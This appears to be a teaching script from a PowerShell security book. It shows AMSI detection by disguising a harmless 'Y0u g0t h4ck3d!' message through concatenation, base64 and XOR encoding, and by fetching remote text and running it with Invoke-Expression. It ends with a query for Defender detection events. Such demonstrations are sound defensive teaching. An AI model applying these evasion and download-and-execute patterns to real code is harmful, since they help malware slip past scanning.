# Example 1
Function Invoke-MaliciousScript {
    Write-Host "Y0u g0t h4ck3d!"
}
Invoke-MaliciousScript

# Example 2
Function Invoke-MaliciousScript {
    $a = 4
    # Concatenate values to form the output string
    $output = "Y0" + "u g" + "0t h" + $a + "ck" + ($a - 1) + "d!"
    Write-Host $output
}
Invoke-MaliciousScript 

# Example 3 - Encoding a string into a base64 string
Function Invoke-MaliciousScript {
    $string = "Y0u g0t h4ck3d!"
    # Convert the string to an array of Unicode bytes
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($string)
    # Convert the byte array to a Base64 encoded string
    $output =[Convert]::ToBase64String($Bytes)

    Write-Host $output
}
Invoke-MaliciousScript

# Example 3 - Decoding a base64 string
Function Invoke-MaliciousScript {
    $string = "WQAwAHUAIABnADAAdAAgAGgANABjAGsAMwBkACEA"
    # Decode the Base64 encoded string to a byte array and convert the byte array to a Unicode string
    $output = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($string))

    Write-Host $output
}
Invoke-MaliciousScript

# Example 4 - Encoding
Function Invoke-MaliciousScript {
    $string = "Y0u g0t h4ck3d!"
    # Define a key value in hexadecimal format (0x12)
    $key = 0x12

    # Convert the string to an array of UTF-8 bytes
    $bytes = [system.Text.Encoding]::UTF8.GetBytes($string)
    # Perform an XOR operation between each byte in the $bytes array and the key value
    $xor = $bytes | ForEach-Object { [char] ($_ -bxor $key)}
    # Convert the resulting XORed bytes to a Base64 encoded string
    $output =[System.Convert]::ToBase64String($xor)

    Write-Host $output
}
Invoke-MaliciousScript

# Example 4 - Decoding
Function Invoke-MaliciousScript {
    $string = "SyJnMnUiZjJ6JnF5IXYz"
    # Define a key value in hexadecimal format (0x12)
    $key = 0x12
	
    # Convert the Base64 encoded string to an array of bytes
    $bytes = [System.Convert]::FromBase64String($string)
    # Perform an XOR operation between each byte in the $bytes array and the key value and join the resulting characters to form the decoded output string
    $output = -join ($bytes | ForEach-Object { [char] ($_ -bxor $key)})

    Write-Host $output
}
Invoke-MaliciousScript

# Example 5
Function Invoke-MaliciousScript {
    # Send a web request to retrieve the content from the specified URL and assign it to the variable $output
    $output = Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter12/AMSIExample5.txt
    # Invoke the expression contained in the $output variable
    Invoke-Expression $output
}
Invoke-MaliciousScript

# Example 6
# Retrieve the content from the specified URL and execute it directly as PowerShell code
Invoke-Expression (Invoke-WebRequest -UseBasicParsing https://raw.githubusercontent.com/PacktPublishing/PowerShell-Automation-and-Scripting-for-CyberSecurity/master/Chapter12/AMSIExample6.txt)

# Evaluate the AMSI related events (Id = 1116) from the 'Microsoft-Windows-Windows Defender/Operational' log provider
Get-WinEvent 'Microsoft-Windows-Windows Defender/Operational' | Where-Object Id -eq 1116 | Format-List